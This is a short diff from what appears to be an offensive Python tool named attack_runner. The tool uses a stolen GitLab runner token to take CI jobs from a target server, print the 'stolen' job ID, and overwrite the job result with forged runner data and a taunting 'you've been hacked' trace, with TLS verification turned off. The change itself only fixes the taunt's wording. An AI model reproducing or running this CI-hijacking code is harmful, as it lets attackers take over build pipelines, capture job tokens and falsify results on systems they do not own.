@@ -75,7 +75,7 @@ def attack_runner(runner_token, gitlab_target, tags, clone):
             id_num = data['id']
             resp_token = data['token']
             print("Stolen ID:", id_num)
-            TROLL_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","state":"success","trace":"\\u001b[0KHi friend! You\'ve hacked :)\\n\\u001b[0;m"}' % resp_token
+            TROLL_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","state":"success","trace":"\\u001b[0KHi friend! You\'ve been hacked :)\\n\\u001b[0;m"}' % resp_token
             resp = sess.put(gitlab_target + "/api/v4/jobs/" + str(id_num), data=TROLL_JSON, headers=headers, verify=False)
             print("Response code:", resp.status_code)
 
